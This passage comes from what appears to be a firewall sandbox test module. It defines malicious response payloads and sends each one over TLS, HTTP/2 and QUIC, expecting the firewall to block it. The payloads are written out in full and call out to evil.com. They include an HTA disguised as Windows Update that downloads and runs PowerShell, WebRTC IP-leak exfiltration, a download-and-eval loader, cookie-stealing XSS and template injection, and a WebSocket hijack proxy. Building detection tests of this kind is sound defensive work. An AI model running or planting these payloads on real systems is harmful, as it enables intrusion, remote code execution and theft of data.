<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Windows Update" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_onLoad
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$c=New-Object Net.WebClient;$c.Proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($c.DownloadString('https://evil.com/payload.ps1'))"" ", 0, False
  self.close
End Sub
</script>
${jsPad(10000)}
</head><body></body></html>`,
    severity: 'critical',
  },

  // ── WebRTC IP Leak / Fingerprinting ──────────────────────────────────────
  {
    id: 'js-webrtc-ip-leak',
    name: 'WebRTC IP leak exploitation (16KB)',
    description: 'JavaScript exploiting WebRTC to reveal real IP addresses behind VPN/proxy',
    contentType: 'application/javascript',
    data: `// WebRTC IP Leak + Advanced Fingerprinting
(function(){
var ips = [];
function getIPs() {
  var pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  pc.createDataChannel('');
  pc.createOffer().then(function(sdp){pc.setLocalDescription(sdp);});
  pc.onicecandidate = function(e) {
    if (!e.candidate) {
      var lines = pc.localDescription.sdp.split('\\n');
      lines.forEach(function(l) {
        if (l.indexOf('a=candidate') > -1) {
          var parts = l.split(' ');
          var ip = parts[4];
          if (ips.indexOf(ip) === -1) { ips.push(ip); }
        }
      });
      // Exfiltrate
      fetch('https://evil.com/ip', {method:'POST', body:JSON.stringify({
        ips: ips, ua: navigator.userAgent, lang: navigator.language,
        platform: navigator.platform, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: screen.width + 'x' + screen.height, touch: navigator.maxTouchPoints
      })});
    }
  };
}
${jsPad(10000)}
getIPs();
})();`,
    severity: 'high',
  },

  // ── Malicious WOFF/Font Files ────────────────────────────────────────────
  {
    id: 'font-exploit-woff',
    name: 'Malicious WOFF font exploit (32KB)',
    description: 'Crafted WOFF font file triggering buffer overflow in font parser',
    contentType: 'font/woff2',
    data: Buffer.concat([
      // WOFF2 header
      Buffer.from('774f4632', 'hex'), // wOF2 signature
      Buffer.from('00010000', 'hex'), // flavor (TrueType)
      Buffer.from('00008000', 'hex'), // length (32KB)
      Buffer.from('000f', 'hex'),     // numTables (15 - abnormally high)
      Buffer.from('00000000', 'hex'), // reserved
      Buffer.from('00008000', 'hex'), // totalSfntSize
      Buffer.from('00000000', 'hex'), // totalCompressedSize
      Buffer.alloc(100, 0x41),        // Malformed table directory
      // Overflow trigger - oversized glyf table pointer
      Buffer.from('ffffffff', 'hex'), // offset overflow
      Buffer.from('ffffffff', 'hex'), // length overflow
      Buffer.alloc(32000 - 130, 0x90), // NOP-sled padding mimicking shellcode
    ]),
    severity: 'high',
  },

  // ── Compiled/Binary JavaScript ───────────────────────────────────────────
  {
    id: 'js-bytenode-compiled',
    name: 'Bytenode compiled malicious JS (64KB)',
    description: 'V8 bytecode compiled JavaScript (bytenode) hiding malicious operations',
    contentType: 'application/javascript',
    data: `// Bytenode loader — compiled V8 bytecode
var fs = require('fs');
var vm = require('vm');
var v8 = require('v8');
v8.setFlagsFromString('--no-flush-bytecode');
// Compiled bytecode (simulated)
var bytecode = Buffer.from([
  0xde, 0xc0, 0xad, 0xde, // V8 magic
  ${Array.from(crypto.randomBytes(2000), b => '0x' + b.toString(16).padStart(2, '0')).join(', ')}
]);
${jsPad(50000)}
// Execute compiled bytecode
try {
  var script = new vm.Script('', {cachedData: bytecode});
  if (!script.cachedDataRejected) { script.runInThisContext(); }
} catch(e) {
  // Fallback: download and eval
  var https = require('https');
  https.get('https://evil.com/fallback.js', function(res) {
    var data = ''; res.on('data', function(d) { data += d; });
    res.on('end', function() { eval(data); });
  });
}`,
    severity: 'critical',
  },

  // ── Injection via JSON/API Response ──────────────────────────────────────
  {
    id: 'json-xss-response',
    name: 'XSS via JSON API response (16KB)',
    description: 'JSON response crafted to trigger XSS when rendered by frontend',
    contentType: 'application/json',
    data: JSON.stringify({
      status: 'success',
      data: {
        name: '</script><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        bio: '<img src=x onerror="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20vcGhpc2g/Yz0iK2RvY3VtZW50LmNvb2tpZQ==\'))">',
        avatar: 'javascript:eval(String.fromCharCode(118,97,114,32,120,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41))',
        website: 'https://evil.com/redirect?to=<script>alert(1)</script>',
        description: '{{constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}}',
      },
      _metadata: { generated: new Date().toISOString() },
    }),
    severity: 'high',
  },

  // ── WebSocket Hijack Payload ─────────────────────────────────────────────
  {
    id: 'ws-hijack-payload',
    name: 'WebSocket hijack and proxy (32KB)',
    description: 'JavaScript that intercepts and proxies all WebSocket connections',
    contentType: 'application/javascript',
    data: `// WebSocket MITM proxy
(function(){
var OrigWS = window.WebSocket;
var PROXY = 'wss://evil.com:8443/ws-proxy';
${jsPad(22000)}
window.WebSocket = function(url, protocols) {
  var real = new OrigWS(url, protocols);
  var proxy = new OrigWS(PROXY);
  proxy.onopen = function() {
    proxy.send(JSON.stringify({type:'new_conn',url:url,origin:location.href}));
  };
  var origSend = real.send.bind(real);
  real.send = function(data) {
    try { proxy.send(JSON.stringify({type:'outgoing',url:url,data:typeof data==='string'?data:btoa(String.fromCharCode.apply(null,new Uint8Array(data)))})); } catch(e){}
    return origSend(data);
  };
  var origOnMsg = null;
  Object.defineProperty(real, 'onmessage', {
    set: function(fn) { origOnMsg = fn;
      real.addEventListener('message', function(e) {
        try { proxy.send(JSON.stringify({type:'incoming',url:url,data:e.data})); } catch(ex){}
      });
    },
    get: function() { return origOnMsg; }
  });
  return real;
};
window.WebSocket.prototype = OrigWS.prototype;
window.WebSocket.CONNECTING = OrigWS.CONNECTING;
window.WebSocket.OPEN = OrigWS.OPEN;
window.WebSocket.CLOSING = OrigWS.CLOSING;
window.WebSocket.CLOSED = OrigWS.CLOSED;
})();`,
    severity: 'critical',
  },
];

// ─── Scenario Generation ─────────────────────────────────────────────────────

function generateTLSSandboxScenarios() {
  return RESPONSE_PAYLOADS.map(payload => ({
    name: `sb-${payload.id}`,
    category: 'SB',
    description: `Sandbox: ${payload.name} — ${payload.description}`,
    side: 'client',
    useNodeTLS: true,
    clientHandler: async (socket, host, logger) => {
      const data = typeof payload.data === 'string' ? Buffer.from(payload.data) : payload.data;

      // POST payload to echo server — firewall should detect malicious content in the response
      const headers = [
        `POST / HTTP/1.1`,
        `Host: ${host}`,
        `Content-Type: ${payload.contentType || 'application/octet-stream'}`,
        `Accept: ${payload.contentType || '*/*'}`,
        `Content-Length: ${data.length}`,
        `Connection: close`,
        ``,
        ``,
      ].join('\r\n');
      socket.write(headers);
      socket.write(data);

      const resp = await new Promise((resolve) => {
        let buf = Buffer.alloc(0);
        socket.on('data', (d) => { buf = Buffer.concat([buf, d]); });
        socket.on('end', () => resolve(buf));
        socket.on('error', () => resolve(buf));
        setTimeout(() => resolve(buf), 8000);
      });

      const respStr = resp.toString('utf8', 0, Math.min(resp.length, 500));
      logger.info(`[sb] ${payload.id}: sent ${data.length}B (${payload.contentType}), received ${resp.length}B`);

      if (resp.length === 0) {
        return { status: 'DROPPED', response: `Blocked (no response) — firewall sandboxed/blocked ${payload.name}` };
      }
      if (respStr.includes('403') || respStr.includes('406') || respStr.includes('451')) {
        return { status: 'DROPPED', response: `Blocked (${respStr.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '4xx'}) — firewall rejected response content` };
      }
      return { status: 'PASSED', response: `Not blocked — ${resp.length}B response echoed (firewall did not sandbox ${payload.name})` };
    },
    expected: 'DROPPED',
    expectedReason: `Firewall should sandbox/block server response containing: ${payload.description}`,
  }));
}

function generateH2SandboxScenarios() {
  return RESPONSE_PAYLOADS.map(payload => ({
    name: `h2-sb-${payload.id}`,
    category: 'AO',
    description: `H2 Sandbox: ${payload.name} — ${payload.description}`,
    side: 'client',
    useNodeH2: true,
    clientHandler: async (session, host, logger) => {
      const data = typeof payload.data === 'string' ? Buffer.from(payload.data) : payload.data;

      const headers = {
        ':method': 'POST',
        ':path': '/',
        ':scheme': 'https',
        ':authority': host,
        'content-type': payload.contentType || 'application/octet-stream',
        'accept': payload.contentType || '*/*',
        'content-length': data.length.toString(),
      };

      const req = session.request(headers);
      req.write(data);
      req.end();

      const result = await new Promise((resolve) => {
        let respStatus = 0;
        let respData = Buffer.alloc(0);
        req.on('response', (h) => { respStatus = h[':status']; });
        req.on('data', (d) => { respData = Buffer.concat([respData, d]); });
        req.on('end', () => resolve({ status: respStatus, data: respData }));
        req.on('error', (e) => resolve({ status: 0, data: Buffer.alloc(0), error: e.message }));
        setTimeout(() => resolve({ status: respStatus, data: respData }), 8000);
      });

      logger.info(`[h2-sb] ${payload.id}: sent ${data.length}B (${payload.contentType}), status=${result.status} resp=${result.data.length}B`);

      if (result.status === 0 || result.error) {
        return { status: 'DROPPED', response: `Blocked (connection reset) — firewall sandboxed/blocked ${payload.name}` };
      }
      if (result.status === 403 || result.status === 406 || result.status === 451) {
        return { status: 'DROPPED', response: `Blocked (HTTP ${result.status}) — firewall rejected response content` };
      }
      return { status: 'PASSED', response: `Not blocked — HTTP ${result.status} ${result.data.length}B (firewall did not sandbox ${payload.name})` };
    },
    expected: 'DROPPED',
    expectedReason: `Firewall should sandbox/block server response over HTTP/2 containing: ${payload.description}`,
  }));
}

function generateQuicSandboxScenarios() {
  return RESPONSE_PAYLOADS.map(payload => ({
    name: `quic-sb-${payload.id}`,
    category: 'QN',
    description: `QUIC Sandbox: ${payload.name} — ${payload.description}`,
    side: 'client',
    protocol: 'quic',
    useQuiche: true,
    clientHandler: async (shim, host, logger, pcap, session) => {
      const data = typeof payload.data === 'string' ? Buffer.from(payload.data) : payload.data;

      const headers = {
        ':method': 'POST',
        ':path': '/',
        ':scheme': 'https',
        ':authority': host,
        'content-type': payload.contentType || 'application/octet-stream',
        'accept': payload.contentType || '*/*',
        'content-length': data.length.toString(),
      };

      const req = session.request(headers);
      req.write(data);
      req.end();

      const result = await new Promise((resolve) => {
        let respStatus = 0;
        let respData = Buffer.alloc(0);
        req.on('response', (h) => { respStatus = h[':status']; });
        req.on('data', (d) => { respData = Buffer.concat([respData, d]); });
        req.on('end', () => resolve({ status: respStatus, data: respData }));
        req.on('error', (e) => resolve({ status: 0, data: Buffer.alloc(0), error: e.message }));
        setTimeout(() => resolve({ status: respStatus, data: respData }), 8000);
      });

      logger.info(`[quic-sb] ${payload.id}: sent ${data.length}B (${payload.contentType}), status=${result.status} resp=${result.data.length}B`);

      if (result.status === 0 || result.error) {
        return { status: 'DROPPED', response: `Blocked (connection reset) — firewall sandboxed/blocked ${payload.name}` };
      }
      if (result.status === 403 || result.status === 406 || result.status === 451) {
        return { status: 'DROPPED', response: `Blocked (HTTP ${result.status}) — firewall rejected response content` };
      }
      return { status: 'PASSED', response: `Not blocked — HTTP ${result.status} ${result.data.length}B (firewall did not sandbox ${payload.name})` };
    },
    expected: 'DROPPED',
    expectedReason: `Firewall should sandbox/block server response over QUIC/HTTP3 containing: ${payload.description}`,
  }));
}

const SB_TLS_SCENARIOS = generateTLSSandboxScenarios();
const SB_H2_SCENARIOS = generateH2SandboxScenarios();
const SB_QUIC_SCENARIOS = generateQuicSandboxScenarios();

module.exports = {
  RESPONSE_PAYLOADS,
  SB_TLS_SCENARIOS,
  SB_H2_SCENARIOS,
  SB_QUIC_SCENARIOS,
  generateTLSSandboxScenarios,
  generateH2SandboxScenarios,
  generateQuicSandboxScenarios,
};
